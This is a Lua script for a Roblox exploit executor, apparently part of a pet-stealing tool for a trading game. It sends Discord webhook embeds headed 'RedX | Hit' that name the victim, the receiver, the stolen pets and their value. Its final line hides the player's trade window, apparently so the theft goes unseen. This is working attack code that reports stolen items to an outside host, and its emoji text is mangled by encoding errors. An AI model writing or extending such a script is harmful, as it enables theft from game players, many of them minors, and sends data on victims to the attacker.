-- SIMPLE WEBHOOK FUNCTION THAT ACTUALLY WORKS
function SendWebhook(url, data)
    local success, result = pcall(function()
        local json = game:GetService("HttpService"):JSONEncode(data)
        return syn.request({
            Url = url,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = json
        })
    end)
    
    if success then
        print("âœ… Webhook sent successfully!")
        return true
    else
        print("âŒ Webhook failed: " .. tostring(result))
        return false
    end
end

function SendMessageEMBED(url, embed_data, isEveryone)
    local data = {
        username = "RedX | Hit",
        avatar_url = "https://i.pinimg.com/736x/d2/cd/f2/d2cdf2a8169c9e444ed5402c67fce98d.jpg",
        embeds = {embed_data}
    }
    
    if isEveryone then
        data.content = "@everyone"
    end
    
    return SendWebhook(url, data)
end

-- Function to send stolen pets information
function SendStolenPets(ReceiverName, stolenPets, totalStolenValue)
    local stolenPetsText = ""
    for i, pet in ipairs(stolenPets) do
        local pet_type = ""
        if pet.properties.mega_neon and pet.properties.flyable and pet.properties.rideable then
            pet_type = " MFR"
        elseif pet.properties.neon and pet.properties.flyable and pet.properties.rideable then
            pet_type = " NFR"
        elseif pet.properties.flyable and pet.properties.rideable then
            pet_type = " FR"
        elseif pet.properties.mega_neon then
            pet_type = " Mega"
        elseif pet.properties.neon then
            pet_type = " Neon"
        elseif pet.properties.flyable then
            pet_type = " Fly"
        elseif pet.properties.rideable then
            pet_type = " Ride"
        end
        stolenPetsText = stolenPetsText .. string.format("%s%s: %d$\n", pet.name, pet_type, math.floor(pet.value))
    end

    local stolenEmbed = {
        title = "**TRADE COMPLETED** :inbox_tray:",
        color = 0x00FF00,
        fields = {
            {
                name = "ã€˜:bust_in_silhouette:ã€™**Trade Details**",
                value = "```lua\n" ..
                        "Victim      : " .. tostring(game.Players.LocalPlayer.Name) .. "\n" ..
                        "Receiver    : " .. tostring(ReceiverName) .. "\n" ..
                        "Total Value : " .. string.format("%d$", math.floor(totalStolenValue)) .. "\n" ..
                        "Pets Stolen : " .. tostring(#stolenPets) .. "```"
            },
            {
                name = "ã€˜:gift:ã€™**Stolen Pets**",
                value = "```lua\n" .. (stolenPetsText ~= "" and stolenPetsText or "No pets stolen") .. "```"
            }
        },
        timestamp = DateTime.now():ToIsoDate()
    }

    print("ğŸ“¤ Sending stolen pets info...")
    return SendMessageEMBED(Webhook, stolenEmbed, false)
end

game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
